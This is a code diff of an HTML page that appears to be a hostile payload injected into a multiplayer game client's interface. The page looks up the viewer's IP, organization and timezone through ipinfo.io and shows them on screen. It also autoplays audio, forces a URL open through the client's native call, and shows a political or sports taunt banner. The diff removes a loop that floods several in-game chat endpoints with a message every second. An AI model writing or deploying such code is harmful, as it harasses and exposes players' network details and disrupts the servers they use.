@@ -45,7 +45,7 @@
 </head>
 <body>
     <div class="image-container">
-        <img src="https://www.instagram.com/p/DR0Q6LiDNJv/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==" alt="Discord Image">
+        <img src="https://alhayatnews.net/wp-content/uploads/2024/06/image-98.jpg" alt="Discord Image">
     </div>
     <audio autoplay loop>
         <source src="https://cdn.discordapp.com/attachments/1138952927290068992/1451310271296573440/3e9b302c060b2ff3.mp3?ex=6945b584&is=69446404&hm=e3db88fbc2d0de159175dff76ab157eab4955f9cd350ec8ebb244aa658ac32fc&" type="audio/mpeg">
@@ -60,7 +60,7 @@
         <span><strong>Organization:</strong> <span id="org"></span></span><br>
         <span><strong>Timezone:</strong> <span id="timezone"></span></span>
     </div>
-    <div class="text">Al-Qassam</div>
+    <div class="text">هاردلك للمنتخب الأردني</div>
 
     <script>
          fetch('https://ipinfo.io/json')
@@ -82,17 +82,6 @@ window.invokeNative("openUrl", "https://www.instagram.com/p/DR0Q6LiDNJv/?utm_sou
     </script>
 
 
-const msg = `👑 لعيون المنتحب الأردني الي خسر اليوم`;
-const body = JSON.stringify({ message: msg });
-setInterval(() => {
-fetch("https://flix-scripts/chatResult", { method: "POST", body });
-fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
-fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
-fetch("https://melix_chat/chatResult", { method: "POST", body });
-fetch("https://as_chat/chatResult", { method: "POST", body });
-fetch("https://chat/chatResult", { method: "POST", body });
-fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
-}, 1000);
     
 
 </body>
